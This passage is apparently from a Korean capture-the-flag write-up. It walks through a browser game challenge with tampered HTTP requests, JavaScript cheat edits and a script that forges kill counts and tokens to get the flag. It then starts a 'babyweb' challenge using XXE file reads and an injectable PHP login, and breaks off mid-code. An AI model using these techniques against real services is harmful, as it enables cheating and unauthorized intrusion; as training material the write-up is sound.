    <p>해당 킬 수는 일정하게 15 Kill를 조작하여 초과할 경우 자동으로 부정행위로 간주되어 그동안 쌓아온 킬을 초기화된다.</p>
  </li>
  <li>
    <p>그러면 반대로 토큰값이 조작되었을 때 아래와 같이 토큰 조작 경고창이 출력된다.</p>
  </li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">POST</span> <span class="o">/</span><span class="ss">check</span><span class="p">.</span><span class="ss">php</span> <span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nv">Host</span><span class="o">:</span> <span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">169</span>
<span class="nv">Accept</span><span class="o">:</span> <span class="o">*/*</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Requested</span><span class="o">-</span><span class="nv">With</span><span class="o">:</span> <span class="nv">XMLHttpRequest</span>
<span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span><span class="o">:</span> <span class="nv">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nv">Macintosh</span><span class="p">;</span> <span class="nv">Intel</span> <span class="nv">Mac</span> <span class="nv">OS</span> <span class="nv">X</span> <span class="m">10</span><span class="nv">_15_6</span><span class="p">)</span> <span class="nv">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nv">KHTML</span><span class="p">,</span> <span class="ss">like</span> <span class="nv">Gecko</span><span class="p">)</span> <span class="nv">Chrome</span><span class="o">/</span><span class="mf">85.0</span><span class="p">.</span><span class="mf">4183.83</span> <span class="nv">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">application</span><span class="o">/</span><span class="ss">x</span><span class="o">-</span><span class="ss">www</span><span class="o">-</span><span class="ss">form</span><span class="o">-</span><span class="ss">urlencoded</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>
<span class="nv">Origin</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Referer</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span><span class="o">/</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span><span class="o">:</span> <span class="ss">gzip</span><span class="p">,</span> <span class="ss">deflate</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Language</span><span class="o">:</span> <span class="ss">ko</span><span class="o">-</span><span class="nv">KR</span><span class="p">,</span><span class="ss">ko</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="ss">en</span><span class="o">-</span><span class="nv">US</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="ss">en</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="ss">ja</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nv">Cookie</span><span class="o">:</span> <span class="nv">PHPSESSID</span><span class="o">=</span><span class="ss">sr6j7mur4mbske04717sbn78k6</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>

<span class="ss">kills</span><span class="o">=</span><span class="m">15</span><span class="o">&amp;</span><span class="ss">token</span><span class="o">=</span><span class="m">79</span><span class="ss">d7ed5a7bfe66da42d96a7ef433ff4c</span>
</code></pre></div></div>

<p>[Token 조작 패킷 - Request]</p>

<ul>
  <li>토큰값 조작</li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="m">200</span> <span class="nv">OK</span>
<span class="nv">Date</span><span class="o">:</span> <span class="nv">Sun</span><span class="p">,</span> <span class="m">30</span> <span class="nv">Aug</span> <span class="m">2020</span> <span class="m">02</span><span class="o">:</span><span class="m">26</span><span class="o">:</span><span class="m">12</span> <span class="nv">GMT</span>
<span class="nv">Server</span><span class="o">:</span> <span class="nv">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="m">38</span> <span class="p">(</span><span class="nv">Debian</span><span class="p">)</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Powered</span><span class="o">-</span><span class="nv">By</span><span class="o">:</span> <span class="nv">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="p">.</span><span class="m">9</span>
<span class="nv">Expires</span><span class="o">:</span> <span class="nv">Thu</span><span class="p">,</span> <span class="m">19</span> <span class="nv">Nov</span> <span class="m">1981</span> <span class="m">08</span><span class="o">:</span><span class="m">52</span><span class="o">:</span><span class="m">00</span> <span class="nv">GMT</span>
<span class="nv">Cache</span><span class="o">-</span><span class="nv">Control</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">store</span><span class="p">,</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span><span class="p">,</span> <span class="ss">must</span><span class="o">-</span><span class="ss">revalidate</span>
<span class="nv">Pragma</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span>
<span class="nv">Vary</span><span class="o">:</span> <span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">161</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">text</span><span class="o">/</span><span class="ss">html</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>

<span class="ss">alert</span><span class="p">(</span><span class="ss">'비정상 행위 탐지!! 토큰값이 일치하지 않습니다. 비정상 행위로 점수가 합쳐지지 않습니다. 새로고침 해주십시오'</span><span class="p">);</span>
</code></pre></div></div>

<p>[Token 조작 패킷 - Response]</p>

<p>조작된 토큰값 행위는 위와 같이 탐지되어 더이상 Kill수가 쌓이지 않는다.</p>

<h3 id="2-hint--debug-정보-찾기">2<strong>. Hint &amp; Debug 정보 찾기</strong></h3>

<ul>
  <li>이제 로직에 대해 파악하였으니, 문제 풀이를 위한 힌트 정보를 찾아보도록 하자.</li>
</ul>

<p><img src="/assets/bob/bob920.png" alt="/assets/bob/bob920.png" /></p>

<ul>
  <li>Chrome Console을 확인해보면 위와 같이 소수점 값을 확인할 수 있다. (출력된 값의 개수는 사용자마다 다를 수 있음.) 해당 값에 대한 정보를 파악하기 위해 “<strong>bob_game.js</strong>” 파일의 492번째 줄 코드를 확인해보도록 하자.</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">initGameStart</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">screen</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="mi">1300</span><span class="p">;</span>
            <span class="nx">screen</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="mi">900</span><span class="p">;</span>
            <span class="nx">gameSize</span> <span class="o">=</span> <span class="p">{</span>
              <span class="na">width</span><span class="p">:</span> <span class="mi">1300</span><span class="p">,</span>
              <span class="na">height</span><span class="p">:</span> <span class="mi">900</span>
            <span class="p">};</span>
            
            <span class="nx">invaderMultiplier</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
            <span class="nx">initialOffsetInvader</span> <span class="o">=</span> <span class="mi">420</span><span class="p">;</span>

          <span class="nx">invaderAttackRate</span> <span class="o">=</span> <span class="mf">0.98</span> <span class="o">+</span> <span class="dl">""</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">10</span><span class="p">);</span>
          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">invaderAttackRate</span><span class="p">);</span>
          <span class="nx">invaderSpeed</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span>
          <span class="nx">spawnDelayCounter</span> <span class="o">=</span> <span class="nx">invaderSpawnDelay</span><span class="p">;</span>
          
          <span class="nx">game</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Game</span><span class="p">();</span>
        <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>492번째 코드는 “<strong>console.log(invaderAttackRate);</strong>” 이며 해당 값은 변수명에서 알 수 있듯, 게임 공격자(외계인)의 공격 속도이며, 해당 값을 조작하여 어떤 반응이 보이는지 확인해 보자.</li>
</ul>

<p><img src="/assets/bob/Not_Attack.gif" alt="/assets/bob/Not_Attack.gif" /></p>

<ul>
  <li>“<strong>invaderAttackRate = 9999;</strong>” 방식으로 공격자(외계인)이 공격을 하지 않는 행위로 로직을 구현할 수 있으며 아래와 같이 반대로 값을 낮춘다면 공격자는 더 빠르고 많이 공격을 하게 된다.</li>
</ul>

<p><img src="/assets/bob/Attack.gif" alt="/assets/bob/Attack.gif" /></p>

<ul>
  <li>“<strong>invaderAttackRate = 0.001;” 이건 답이 없다….</strong></li>
</ul>

<p>위와 같이 힌트를 통하여 Javasciprt Debug를 통하여 로직을 변경할 수 있는 걸 확인할 수 있다. 하지만 공격 속도로 변경하는 것 보단 “<strong>스피드</strong>” + “<strong>무적</strong>” + “<strong>공격수 무한</strong>“를 걸어 문제 풀거나 자바스크립트 로직을 통하여 게임을 진행하지 않고 풀이를 진행할 수 있다.</p>

<h3 id="3-스피드--무적--공격-속도-핵-만들기">3<strong>. 스피드 + 무적 + 공격 속도 핵 만들기</strong></h3>

<ul>
  <li>이제 로직에 대해 파악하였으니, 문제 풀이를 위한 힌트 정보를 찾아보도록 하자.</li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">var</span> <span class="nv">Player</span> <span class="o">=</span> <span class="ss">function</span><span class="p">()</span> <span class="p">{</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">active</span> <span class="o">=</span> <span class="ss">true</span><span class="p">;</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">size</span> <span class="o">=</span> <span class="p">{</span>
            <span class="ss">width</span><span class="o">:</span> <span class="mf">0.1</span><span class="p">,</span>  <span class="o">//</span><span class="m">232</span><span class="err">번째</span> <span class="m">16</span> <span class="o">-&gt;</span> <span class="mf">0.1</span> <span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">게임</span> <span class="err">플레이어</span> <span class="err">안보이게</span> <span class="err">설정</span><span class="p">)</span>
            <span class="ss">height</span><span class="o">:</span> <span class="mf">0.1</span>  <span class="o">//</span><span class="m">233</span><span class="err">번째</span> <span class="m">8</span>  <span class="o">-&gt;</span> <span class="mf">0.1</span> <span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">게임</span> <span class="err">플레이어</span> <span class="err">안보이게</span> <span class="err">설정</span><span class="p">)</span>
          <span class="p">};</span>

<span class="o">//</span> <span class="m">259</span><span class="err">번째</span> <span class="err">라인</span>
<span class="ss">if</span> <span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="ss">isDown</span><span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="nv">KEYS</span><span class="p">.</span><span class="nv">LEFT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">-=</span> <span class="m">30</span><span class="p">;</span> <span class="o">//</span> <span class="m">2</span> <span class="o">-&gt;</span> <span class="m">30</span><span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">스피드</span> <span class="err">핵</span><span class="p">)</span>

<span class="o">//</span> <span class="m">260</span><span class="err">번째</span> <span class="err">라인</span>
<span class="ss">else</span> <span class="ss">if</span> <span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="ss">isDown</span><span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="nv">KEYS</span><span class="p">.</span><span class="nv">RIGHT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">&lt;</span> <span class="ss">gameSize</span><span class="p">.</span><span class="ss">width</span> <span class="o">-</span> <span class="ss">this</span><span class="p">.</span><span class="ss">size</span><span class="p">.</span><span class="ss">width</span><span class="p">)</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">+=</span> <span class="m">30</span><span class="p">;</span> <span class="o">//</span> <span class="m">2</span> <span class="o">-&gt;</span> <span class="m">30</span><span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">스피드</span> <span class="err">핵</span><span class="p">)</span>

<span class="ss">if</span> <span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="ss">isDown</span><span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="nv">KEYS</span><span class="p">.</span><span class="nv">Space</span><span class="p">))</span> <span class="p">{</span>
            <span class="o">//</span> <span class="m">263</span><span class="err">번째</span>  <span class="ss">this</span><span class="p">.</span><span class="ss">shooterHeat</span> <span class="o">+=</span> <span class="m">1</span><span class="p">;</span> <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">공격</span> <span class="err">속도</span> <span class="err">무제한</span><span class="p">)</span>

<span class="ss">destroy</span><span class="o">:</span> <span class="ss">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="o">//</span><span class="m">291</span><span class="err">번째</span> <span class="ss">this</span><span class="p">.</span><span class="ss">active</span> <span class="o">=</span> <span class="ss">false</span><span class="p">;</span>  <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">무적</span><span class="p">)</span>
            <span class="o">//</span><span class="m">292</span><span class="err">번째</span> <span class="ss">game</span><span class="p">.</span><span class="ss">lost</span> <span class="o">=</span> <span class="ss">true</span><span class="p">;</span>     <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">무적</span> <span class="o">-</span> <span class="err">게임</span> <span class="err">종료</span> <span class="err">안되게</span><span class="p">)</span>
          <span class="p">}</span>

<span class="ss">var</span> <span class="nv">Projectile</span> <span class="o">=</span> <span class="ss">function</span><span class="p">(</span><span class="ss">coordinates</span><span class="p">,</span> <span class="ss">velocity</span><span class="p">)</span> <span class="p">{</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">active</span> <span class="o">=</span> <span class="ss">true</span><span class="p">;</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span> <span class="o">=</span> <span class="ss">coordinates</span><span class="p">;</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">size</span> <span class="o">=</span> <span class="p">{</span>
            <span class="ss">width</span><span class="o">:</span> <span class="m">300</span><span class="p">,</span> <span class="o">//</span><span class="m">303</span><span class="err">번째</span> <span class="err">줄</span>  <span class="m">3</span> <span class="o">-&gt;</span> <span class="m">300</span><span class="err">으로</span> <span class="err">변경</span> <span class="err">수정</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">공격</span> <span class="err">크기</span> <span class="err">변경</span><span class="p">)</span>
            <span class="ss">height</span><span class="o">:</span> <span class="m">3</span>
          <span class="p">};</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">velocity</span> <span class="o">=</span> <span class="ss">velocity</span><span class="p">;</span>
        <span class="p">};</span>

<span class="o">//</span><span class="m">491</span><span class="err">번째</span> <span class="ss">invaderAttackRate</span> <span class="o">=</span> <span class="mf">0.98</span> <span class="o">+</span> <span class="s2">""</span> <span class="o">+</span> <span class="nv">Math</span><span class="p">.</span><span class="ss">floor</span><span class="p">(</span><span class="nv">Math</span><span class="p">.</span><span class="ss">random</span><span class="p">()</span> <span class="o">*</span> <span class="m">10</span><span class="p">);</span> <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">공격자</span> <span class="err">외계인이</span> <span class="err">공격</span> <span class="err">못하도록</span> <span class="err">수정</span><span class="p">)</span>

</code></pre></div></div>

<ul>
  <li>위와 같이 Javascript를 변경하여 플레이를 할 경우 아래와 같이 실행된다.</li>
</ul>

<p><img src="/assets/bob/clear.gif" alt="/assets/bob/clear.gif" /></p>

<ul>
  <li>게임핵 완성하여 플래그 획득!</li>
  <li>물론 위 와 같이 Javascript 게임 핵을 만들어 플레이하여 플래그를 획득할 수 있지만, 게임 로직을 파악하여 Javascript를 코딩할 수 있다면 플레이 대신 반복문으로 아래와 같이 플래그를 획득할 수 있다.</li>
</ul>

<h3 id="4-javascript-coding를-통하여-플래그-획득하기">4<strong>. Javascript Coding를 통하여 플래그 획득하기</strong></h3>

<ul>
  <li>이번에는 게임 핵으로 문제풀이 대신 Javascript 코딩을 통하여 플래그를 획득 하자.</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nx">ajaxSetup</span><span class="p">({</span><span class="na">async</span><span class="p">:</span> <span class="kc">false</span><span class="p">});</span>  

<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">check.php</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">kills</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="na">token</span><span class="p">:</span> <span class="dl">"</span><span class="s2">start</span><span class="dl">"</span><span class="p">};</span>
<span class="nx">token</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">token</span> <span class="o">=</span> <span class="nx">response</span><span class="p">;</span>
    
<span class="p">});</span>

<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">35</span><span class="p">;</span>  <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">kills</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="na">token</span><span class="p">:</span> <span class="nx">token</span><span class="p">};</span>

    
    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">token</span> <span class="o">=</span> <span class="nx">response</span><span class="p">;</span>
    <span class="p">});</span>
<span class="p">};</span>

<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">check</span><span class="p">:</span> <span class="dl">"</span><span class="s2">clear</span><span class="dl">"</span><span class="p">};</span>
<span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">eval</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<ul>
  <li>Game 로직을 파악했다면 위와 같이 Javascript Code의 Ajax를 통하여 문제를 풀 수 있다.
로직의 원리는 Kills수가 15를 초과할 수 없으므로, 먼저 Token값에 “<strong>start</strong>“를 보내어 두 번째 이후부터 응답되어 온 토큰을 가지고 다시 35번 반복을 통하여 토큰을 전송하고, 마지막으로 공격자(외계인)를 전부 물리쳤다는 “<strong>check=clear</strong>” 값을 전송하여 플래그를 획득하는 로직이다.</li>
</ul>

<p><img src="/assets/bob/clears.gif" alt="/assets/bob/clears.gif" /></p>

<ul class="task-list">
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Flag is bob{b0b_!s_fun_g@me_r3tr0}</p>
  </li>
  <li class="task-list-item">
    <p>대회 끝나고 Access.log를 확인해본 결과… “<strong>105961</strong>” Line이 쌓였네요. 3일 만에 10만 줄이 쌓인 걸 보니 오기로 게임 플레이어 하여 플래그를 획득한 분도 계실 거라 예상됩니다… (존경스럽습니다…)</p>
  </li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="babyweb">babyweb</h2>

<hr />

<p><img src="/assets/bob/bob921.png" alt="/assets/bob/bob921.png" /></p>

<p>문제 설명에 /readFlag 라고 되어 있으므로 RCE를 해야하는 문제이다.</p>

<p>문제 페이지에 접속하면 XML 사용하는 페이지가 나온다.</p>

<p><img src="/assets/bob/bob922.png" alt="/assets/bob/bob922.png" /></p>

<p>XXE 공격을 통해 소스 페이지를 하나하나씩 본다.</p>

<p>먼저 “join.php”를 보면 htmlentities를 통해 무언가를 막으려하는 것을 볼 수 있다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s2">"UTF-8"</span><span class="p">));</span>
	<span class="nv">$pw</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]);</span>
	<span class="nv">$nick</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'nick'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s2">"UTF-8"</span><span class="p">));</span>

	<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"INSERT INTO users VALUES (NULL,'</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">', '</span><span class="si">{</span><span class="nv">$pw</span><span class="si">}</span><span class="s2">', '</span><span class="si">{</span><span class="nv">$nick</span><span class="si">}</span><span class="s2">', '');"</span><span class="p">;</span>

	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;location.href="./";&lt;/script&gt;'</span><span class="p">;</span>
	<span class="k">else</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Error"); history.go(-1);&lt;/script&gt;'</span><span class="p">;</span>

</code></pre></div></div>

<p>그리고 login.php를 보면 $_SESSION 변수에 로그인한 아이디와 닉네임을 넣는다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]);</span>
	<span class="nv">$pw</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]);</span>

	<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE userid='</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">' AND password='</span><span class="si">{</span><span class="nv">$pw</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>

	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
	<span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="nv">$id</span><span class="o">===</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$pw</span><span class="o">===</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]){</span>

		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">];</span>
		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">];</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;location.href="./";&lt;/script&gt;'</span><span class="p">;</span>
	<span class="p">}</span><span class="k">else</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Error"); history.go(-1);&lt;/script&gt;'</span><span class="p">;</span>

</code></pre></div></div>

<p>RCE를 위해서는 LFI 취약점이 필요하다. LFI를 하기 위해선 파일 업로드 기능을 이용하거나 파일에 원하는 것을 쓸 수 있는 기능이 있으면 된다.</p>

<p>하지만 “join.php”에서 htmlentities를 이용해 세션 파일에 php 태그를 사용할 수 없도록 제한하였다.</p>

<p>그 다음 “getxmldata.php”를 보면 mysqli_real_escape_string를 통해서 SQLI를 막은 것 처럼 보이지만 실제로는 막히지 않았다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">xss_filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> 
<span class="p">{</span> 
    <span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> 
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span> 
         
    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> 
    <span class="p">{</span> 
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> 
        <span class="p">{</span> 
            <span class="nv">$data</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> 
        <span class="p">}</span> 
         
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span> 
    <span class="p">}</span> 
     
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'&amp;amp;'</span><span class="p">,</span><span class="s1">'&amp;lt;'</span><span class="p">,</span><span class="s1">'&amp;gt;'</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">'&amp;amp;amp;'</span><span class="p">,</span><span class="s1">'&amp;amp;lt;'</span><span class="p">,</span><span class="s1">'&amp;amp;gt;'</span><span class="p">),</span> <span class="nv">$data</span><span class="p">);</span> 
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(&amp;#*\\w+)[\\x00-\\x20]+;/'</span><span class="p">,</span> <span class="s1">'$1;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(&amp;#x*[0-9A-F]+);*/i'</span><span class="p">,</span> <span class="s1">'$1;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 

    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"html_entity_decode"</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
